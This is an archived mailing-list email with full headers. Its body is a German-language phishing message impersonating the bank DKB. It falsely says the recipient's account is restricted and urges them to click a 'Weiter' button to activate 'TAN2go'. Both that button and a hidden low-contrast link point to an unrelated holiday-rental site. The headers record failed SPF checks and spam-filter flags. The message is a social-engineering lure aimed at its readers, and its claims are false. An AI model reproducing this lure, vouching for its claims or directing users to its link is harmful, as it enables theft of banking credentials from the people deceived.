Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 69F045B45E3
	for <lists+industrypack-devel@lfdr.de>; Sat, 10 Sep 2022 12:18:53 +0200 (CEST)
Received: from [127.0.0.1] (helo=sfs-ml-4.v29.lw.sourceforge.com)
	by sfs-ml-4.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1oWxZP-0000f9-L6
	for lists+industrypack-devel@lfdr.de;
	Sat, 10 Sep 2022 10:18:52 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-4.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <kuj@fla.de>) id 1oWxZ5-0000em-Ik
 for industrypack-devel@lists.sourceforge.net;
 Sat, 10 Sep 2022 10:18:32 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
 :Message-ID:From:Date:Subject:To:List-id:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=x1IG5EW3e3aND4rxohCXwXLDlkZq3DtFOKT/kXCnhAo=; b=hI8EPDbanwK67zM+0OkLzHNvVc
 5Q1qyOCkJ+zHgf8/6ne04Jo69eJanML+JOhzil9unAxu5OpZlEa4c38eDs5kQRug+ezB9l49Z87hF
 OVceW4ITr0FY/sjv5bZpVNkVFV7vo4Z1LHxh+wcqFSvG/ZJ3OOrYAEIapnTxOTuow7dU=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:From:Date:
 Subject:To:List-id:Sender:Reply-To:Cc:Content-ID:Content-Description:
 Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:
 In-Reply-To:References:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=x1IG5EW3e3aND4rxohCXwXLDlkZq3DtFOKT/kXCnhAo=; b=O
 vbiW+COXGe/eQfzgIeLxfLK/4j6tQ8CCBVdO4qe+u0NP6/B4fvQQP+HucxdDz7p2O0US+58S3t073
 F93iTn4n9dHMg+XCIc57wJ8saeVkjjP5QgdfK2U7RtO3HJ2A4ecl17f5xl3+igLFuT/jgJH29QdFf
 d9wXeMIhuFDYWdYM=;
Received: from [64.235.37.118] (helo=fla.de)
 by sfi-mx-2.v28.lw.sourceforge.com with esmtp (Exim 4.95)
 id 1oWxZH-0003PI-8l for industrypack-devel@lists.sourceforge.net;
 Sat, 10 Sep 2022 10:18:32 +0000
To: industrypack-devel@lists.sourceforge.net
Date: Sat, 10 Sep 2022 12:01:06 +0200
From: dkb online <sjaaksmit@fla.de>
Message-ID: <8ab904b36c3eae8d5b1f10d56c5555ec@fla.de>
MIME-Version: 1.0
X-mailer: Cabestan DMS
X-Spam-Score: 2.2 (++)
X-Spam-Report: Spam detection software,
 running on the system "util-spamd-1.v13.lw.sourceforge.com", 
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview:  &nbsp; &nbsp;DKB Sehr geehrter Kunde 
 Content analysis details:   (2.2 points, 6.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 0.0 URIBL_BLOCKED          ADMINISTRATOR NOTICE: The query to URIBL was
 blocked.  See
 http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
 for more information. [URIs: locations-villas-vacances.fr]
 0.0 SPF_HELO_FAIL          SPF: HELO does not match SPF record (fail)
 [SPF failed: Please see http://www.openspf.org/Why?s=helo; id=fla.de;
 ip=64.235.37.118; r=util-spamd-1.v13.lw.sourceforge.com]
 0.9 SPF_FAIL               SPF: sender does not match SPF record (fail)
 [SPF failed: Please see http://www.openspf.org/Why?s=mfrom; id=kuj%40fla.de;
 ip=64.235.37.118; r=util-spamd-1.v13.lw.sourceforge.com]
 0.0 HTML_FONT_LOW_CONTRAST BODY: HTML font color similar or
 identical to background
 0.0 HTML_MESSAGE           BODY: HTML included in message
 0.0 HTML_FONT_SIZE_HUGE    BODY: HTML font size is huge
 1.3 RDNS_NONE Delivered to internal network by a host with no rDNS
 0.0 NORDNS_LOW_CONTRAST    No rDNS + hidden text
X-Headers-End: 1oWxZH-0003PI-8l
Subject: [Industrypack-devel] Wichtig !
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============0690506704257692791=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

This is a multi-part message in MIME format.

--===============0690506704257692791==
Content-Type: multipart/alternative;
	boundary="1cf971ff57deb9beeaa4f76a28291489e"
Content-Transfer-Encoding: 8bit

This is a multi-part message in MIME format.

--1cf971ff57deb9beeaa4f76a28291489e
Content-Type: text/plain; charset=us-ascii







  
    
      
&nbsp;
    
    
      &nbsp;DKB
      
      
    
    
      
      Sehr
geehrter Kunde
      
Wir bedauern, Ihnen mitteilen zu m&uuml;ssen, dass wir Ihr Konto
vor&uuml;bergehend eingeschr&auml;nkt haben. Gem&auml;B der
neuen Gesetzgebung sind wir verpflichtet, alle unsere Firmenkonten in
regelm&auml;Bigen Abst&auml;nden auf die G&uuml;ltigkeit
der gespeicherten Daten zu &uuml;berpr&uuml;fen. Eine
&Uuml;berpr&uuml;fung Ihres Kontos ergab, dass Sie das neue
Sicherheitssystem&nbsp;Dkb
TAN2go&nbsp;noch
nicht aktiviert haben.
      
Bitte schlieBen Sie diesen Vorgang sofort ab, indem Sie auf den unten
stehenden Link klicken
      &nbsp;
      
    
    
      
      Weiter
&gt;
      
    
    
      &nbsp; &nbsp; &nbsp;
    
    
      
      Mit
freundlichen Gr&uuml;ken
      Deutsche
kredit bank &copy;2022.
      
      
    
  


  
    
    
    
      
    
    
      &nbsp;
    
    
      
    
  


eqfd



--1cf971ff57deb9beeaa4f76a28291489e
Content-Type: text/html; charset=us-ascii

<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
</head>
<body>
<table
 style="letter-spacing: normal; orphans: 2; text-transform: none; widows: 2; word-spacing: 0px; font-family: ArialMT,Arial; font-size: 13px; font-weight: 400; line-height: normal; border-collapse: collapse;"
 cellpadding="0" cellspacing="0" width="100%">
  <tbody>
    <tr>
      <td rowspan="8" width="15%"><br
 class="Apple-interchange-newline">
&nbsp;</td>
    </tr>
    <tr>
      <td>&nbsp;<big style="color: rgb(0, 0, 153);"><big><big><big><big><big><big><big><span
 style="font-weight: bold;">DKB</span></big></big></big></big></big></big></big></big><br>
      <br>
      </td>
    </tr>
    <tr>
      <td>
      <p
 style="margin: 0px 0px 1em; font-family: ArialMT,Arial; color: rgb(82, 80, 80);"><a
 style="text-decoration: none; color: inherit; font-weight: bold; cursor: pointer;">Sehr
geehrter Kunde</a><br>
      <br>
Wir bedauern, Ihnen mitteilen zu m&uuml;ssen, dass wir Ihr Konto
vor&uuml;bergehend eingeschr&auml;nkt haben. Gem&auml;B der
neuen Gesetzgebung sind wir verpflichtet, alle unsere Firmenkonten in
regelm&auml;Bigen Abst&auml;nden auf die G&uuml;ltigkeit
der gespeicherten Daten zu &uuml;berpr&uuml;fen. Eine
&Uuml;berpr&uuml;fung Ihres Kontos ergab, dass Sie das neue
Sicherheitssystem<span>&nbsp;</span><strong>Dkb
TAN2go<span><span>&nbsp;</span></span></strong>noch
nicht aktiviert haben.<br>
      <br>
Bitte schlieBen Sie diesen Vorgang sofort ab, indem Sie auf den unten
stehenden Link klicken</p>
      <p
 style="margin: 0px 0px 1em; font-family: ArialMT,Arial; color: rgb(82, 80, 80);">&nbsp;</p>
      </td>
    </tr>
    <tr
 style="background-color: rgb(255, 255, 255); color: rgb(0, 0, 153);">
      <td align="center">
      <div class="button" style="padding-bottom: 45px;"><a
 class="b"
 href="https://www.locations-villas-vacances.fr/vacances"
 target="_blank"
 style="padding: 7px 50px; text-decoration: underline; font-weight: bold; cursor: pointer; position: relative; margin-bottom: 50px;">Weiter
&gt;</a></div>
      </td>
    </tr>
    <tr>
      <td>&nbsp; &nbsp; &nbsp;</td>
    </tr>
    <tr>
      <td>
      <h2 style="font-size: 21px; color: rgb(37, 51, 109);">Mit
freundlichen Gr&uuml;ken</h2>
      <p class="ParagraphFooterOne"
 style="margin: 0px 0px 1em; font-family: ArialMT,Arial; color: rgb(82, 80, 80); font-weight: bold;">Deutsche
kredit bank &copy;2022.</p>
      <p class="ParagraphFooterTwo"
 style="margin: 0px 0px 1em; font-family: ArialMT,Arial; color: rgb(37, 51, 109);"></p>
      </td>
    </tr>
  </tbody>
</table>
<table
 style="letter-spacing: normal; orphans: 2; text-transform: none; widows: 2; word-spacing: 0px; font-family: ArialMT,Arial; font-size: 13px; font-weight: 400; line-height: normal; border-collapse: collapse; background-color: rgb(253, 206, 0); width: 338.792px; text-align: left; margin-left: auto; margin-right: auto;"
 cellpadding="0" cellspacing="0">
  <tbody>
    <tr>
    </tr>
    <tr>
      <td style="background-color: rgb(0, 0, 153);"></td>
    </tr>
    <tr>
      <td style="background-color: rgb(0, 0, 153);">&nbsp;</td>
    </tr>
    <tr>
      <td
 style="text-align: center; background-color: rgb(0, 0, 153);"></td>
    </tr>
  </tbody>
</table>
<br
 style="color: rgb(0, 0, 0); font-family: Verdana; font-size: 12px; font-style: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px;">
<a href="https://www.locations-villas-vacances.fr/vacances"
 target="_blank"
 style="font-family: Verdana; font-size: 12px; font-style: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; color: rgb(204, 255, 255);">eqfd</a>
</body>
</html>



--1cf971ff57deb9beeaa4f76a28291489e--



--===============0690506704257692791==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============0690506704257692791==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============0690506704257692791==--


